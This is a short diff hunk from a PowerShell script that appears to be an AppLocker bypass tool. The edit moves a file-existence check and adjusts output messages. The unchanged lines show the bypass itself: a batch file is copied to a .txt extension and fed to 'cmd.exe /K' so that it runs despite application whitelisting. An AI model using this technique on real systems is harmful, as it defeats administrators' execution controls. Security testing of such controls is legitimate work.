@@ -322,23 +322,23 @@ If($TestBat -Match '\\'){
    $RawFullPath = $TestBat -replace 'bat','txt'   ## C:\Users\pedro\Coding\applock.txt
    $StripPath = $TestBat -replace "\\$RawName","" ## C:\Users\pedro\Coding
 
-   ## Make sure the user input file exists
-   If(-not(Test-Path -Path "$TestBat" -EA SilentlyContinue)){
-      Write-Host "`n`n[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
-      exit ## Exit @AppLocker
-   }
-
    ## Build Output Table
    Write-Host "`n`nAppLocker – Executing $RawName script" -ForegroundColor Green
    Write-Host "----------------------------------------";Start-Sleep -Seconds 1
-   Write-Host "[+] found: $TestBat";Start-Sleep -Seconds 1
+   ## Make sure the user input file exists
+   If(Test-Path -Path "$TestBat" -EA SilentlyContinue){
+      Write-Host "[+] found: $TestBat";Start-Sleep -Seconds 1
+   }Else{## User Input File NOT found!
+      Write-Host "`n`n[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
+      exit ## Exit @AppLocker
+   }
 
    Write-Host "[i] converting $RawName to $Bypassext";Start-Sleep -Seconds 1
    Copy-Item -Path "$TestBat" -Destination "$RawFullPath" -EA SilentlyContinue -Force
 
    cd $StripPath
    Write-Host "[i] trying to execute $Bypassext text file"
-   Start-Sleep -Seconds 1;Write-Host "script output:`n`n"
+   Start-Sleep -Seconds 1;Write-Host "[+] script output:`n`n"
    Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < $Bypassext"
 
    cd $Working_Directory
